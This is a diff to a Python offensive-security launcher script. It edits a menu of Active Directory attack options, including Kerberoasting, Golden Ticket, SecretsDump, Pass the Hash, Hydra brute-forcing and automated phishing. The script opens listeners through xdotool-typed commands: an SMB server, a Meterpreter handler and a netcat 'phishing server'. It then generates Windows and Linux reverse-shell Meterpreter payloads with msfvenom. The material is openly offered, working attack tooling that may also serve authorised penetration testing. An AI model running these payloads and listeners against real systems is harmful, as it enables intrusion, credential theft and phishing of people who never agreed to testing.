@@ -536,17 +536,17 @@ def display():
    return
    
 def options():
-   print('\u2551' + " (01) Re/Set DNS SERVER  (12) Sync SERVER Time (21) GetArch (31) WinDap Search    (41) Kerberos Info (51) Golden PAC  (61) Editor USER (78) Hydra  FTP (89) FTP    " + '\u2551')
-   print('\u2551' + " (02) Re/Set REMOTE IP   (13) Whois DNS SERVER (22) NetView (32) Lookup SIDs      (42) KerberoFilter (52) Domain Dump (62) Editor PASS (79) Hydra  SSH (90) SSH    " + '\u2551')
-   print('\u2551' + " (03) Re/Set LIVE PORTS  (14) dig DNS SERVER   (23) Service (33) Sam Dump Users   (43) KerberosBrute (53) *BloodHound (63) Editor HASH (80) Hydra  SMB (91) SSH ID " + '\u2551')
-   print('\u2551' + " (04) Re/Set WEBSITE URL (15) Recon DNS SERVER (24) AtExec  (34) REGistry Hives   (44) Kerberoasting (54) *BH ACLPwn  (64) Editor HOST (81) Hydra POP3 (92) Telnet " + '\u2551')
-   print('\u2551' + " (05) Re/Set USER NAME   (16) Dump DNS SERVER  (25) DcomExe (35) List EndPoints   (45) Kerbero Spray (55) SecretsDump (65) GenSSHkeyID (82) Hydra HTTP (93) NetCat " + '\u2551')
-   print('\u2551' + " (06) Re/Set PASS WORD   (17) NMap LIVE PORTS  (26) PsExec  (36) Rpc Client       (46) PASSWORD2HASH (56) CrackMapExe (66) GenListUser (83) Hydra  TOM (94) SQSH   " + '\u2551')
-   print('\u2551' + " (07) Re/Set NTLM HASH   (18) NMap PORTService (27) SmbExec (37) Smb Client       (47) HASHs Sprayer (57) PSExec HASH (67) GenListPass (84) MSF TOMCAT (95) MSSQL  " + '\u2551')
-   print('\u2551' + " (08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (28) WmiExec (38) Smb Map SHARES   (48) Pass the HASH (58) SmbExecHASH (74) GenPhishCod (85) RemoteSync (96) MySQL  " + '\u2551')
-   print('\u2551' + " (09) Re/Set DOMAIN NAME (20) Nmap SERVER Time (29) IfMap   (39) Smb Dump Files   (49) Silver Ticket (59) WmiExecHASH (75) AutoPhisher (86) RSyncDumps (97) WinRm  " + '\u2551')
-   print('\u2551' + " (10) Re/Set DOMAIN SID                        (30) OpDump  (40) SmbMount SHARE   (50) Golden Ticket (60) NTDSDecrypt (76) Dir Searchs (87) RemDesktop (98)        " + '\u2551')
-   print('\u2551' + " (11) Re/Set SHARE NAME                                                                                               (77) Nikto Scans (88) XemDesktop (99) Exit   " + '\u2551')
+   print('\u2551' + " (01) Re/Set DNS  SERVER (12) Sync SERVER Time (21) GetArch (31) WinDap  Search   (41) Kerberos Info (51) Golden  PAC (61) Editor USER (78) Hydra  FTP (89) FTP    " + '\u2551')
+   print('\u2551' + " (02) Re/Set REMOTE ADDR (13) Whois DNS SERVER (22) NetView (32) Lookup    SIDs   (42) KerberoFilter (52) Domain Dump (62) Editor PASS (79) Hydra  SSH (90) SSH    " + '\u2551')
+   print('\u2551' + " (03) Re/Set LIVE  PORTS (14) dig   DNS SERVER (23) Service (33) Sam Dump Users   (43) KerberosBrute (53) *BloodHound (63) Editor HASH (80) Hydra  SMB (91) SSH ID " + '\u2551')
+   print('\u2551' + " (04) Re/Set WEBSITE URL (15) Recon DNS SERVER (24) At Exec (34) REGistry Hives   (44) Kerberoasting (54) *BH  ACLPwn (64) Editor HOST (81) Hydra POP3 (92) Telnet " + '\u2551')
+   print('\u2551' + " (05) Re/Set USER   NAME (16) Dump  DNS SERVER (25) DcomExe (35) List EndPoints   (45) Kerbero Spray (55) SecretsDump (65) GenSSHkeyID (82) Hydra HTTP (93) NetCat " + '\u2551')
+   print('\u2551' + " (06) Re/Set PASS   WORD (17) NMap  LIVE PORTS (26) Ps Exec (36) RpcClient Serv   (46) PASSWORD2HASH (56) CrackMapExe (66) GenListUser (83) Hydra  TOM (94) SQSH   " + '\u2551')
+   print('\u2551' + " (07) Re/Set NTLM   HASH (18) NMap PORTService (27) SmbExec (37) SmbClient Serv   (47) HASHs Sprayer (57) PSExec HASH (67) GenListPass (84) MSF TOMCAT (95) MS SQL " + '\u2551')
+   print('\u2551' + " (08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (28) WmiExec (38) Smb Map SHARES   (48) Pass the HASH (58) SmbExecHASH (74) GenPhishCod (85) RemoteSync (96) My SQL " + '\u2551')
+   print('\u2551' + " (09) Re/Set DOMAIN NAME (20) Nmap SERVER Time (29) If  Map (39) Smb Dump Files   (49) Silver Ticket (59) WmiExecHASH (75) AutoPhisher (86) RSyncDumps (97) WinRem " + '\u2551')
+   print('\u2551' + " (10) Re/Set DOMAIN  SID                       (30) Op Dump (40) SmbMount SHARE   (50) Golden Ticket (60) NTDSDecrypt (76) Dir Searchs (87) RemDesktop (98)        " + '\u2551')
+   print('\u2551' + " (11) Re/Set SHARE  NAME                                                                                              (77) Nikto Scans (88) XemDesktop (99) Exit   " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -717,7 +717,7 @@ else:
 
 print("[*] Starting HTTP server...")
 command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return; sleep 1")
+command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
 command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return")
 command("xdotool type 'cat " + dataDir + "/banner2.txt'; xdotool key Return")
 command("xdotool type 'python3 -m http.server 8080'; xdotool key Return")
@@ -732,7 +732,7 @@ command("xdotool type 'python3 -m http.server 8080'; xdotool key Return")
 
 print("[*] Starting SMB server...")
 command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return; sleep 1")
+command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return")
 command("xdotool type 'clear; cat " + dataDir + "/banner3.txt'; xdotool key Return")
 command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return")
 
@@ -754,7 +754,7 @@ with open("meterpreter.rc", "w") as write:
    write.write("run\n")   
    
 command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return; sleep 1")
+command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
 command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
 
 # -------------------------------------------------------------------------------------
@@ -767,7 +767,7 @@ command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
 
 print("[*] Starting phishing server...")
 command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'GO PHISHING'; xdotool key Return; sleep 1")
+command("xdotool key Alt+Shift+S; xdotool type 'GO PHISHING'; xdotool key Return")
 command("xdotool type 'clear; cat " + dataDir + "/banner5.txt'; xdotool key Return")
 command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return")
 command("xdotool key Ctrl+Shift+Tab")
@@ -780,11 +780,11 @@ command("xdotool key Ctrl+Shift+Tab")
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
-print("[*] Creating exploit files...")
-command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -a x64 -f exe -o " + httpDir + "/winshell64.exe > /dev/null 2>&1")
+print("[!] Starting rogue agent in a few seconds....")
+command("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -a x64 -f exe -o " + httpDir + "/winshell64.exe > /dev/null 2>&1")
 command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -a x86 -f exe -o " + httpDir + "/winshell32.exe > /dev/null 2>&1")
-command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform linux/x64/meterpreter/reverse_tcp -f exe -o " + httpDir + "/linuxshell64.elf > /dev/null 2>&1")
-command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform linux/x86/meterpreter/reverse_tcp -f exe -o " + httpDir + "/linuxshell32.elf > /dev/null 2>&1")
+command("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform linux -a x64 -f elf -o " + httpDir + "/linshell64.elf > /dev/null 2>&1")
+command("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform linux -a x86 -f elf -o " + httpDir + "/linshell32.elf > /dev/null 2>&1")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
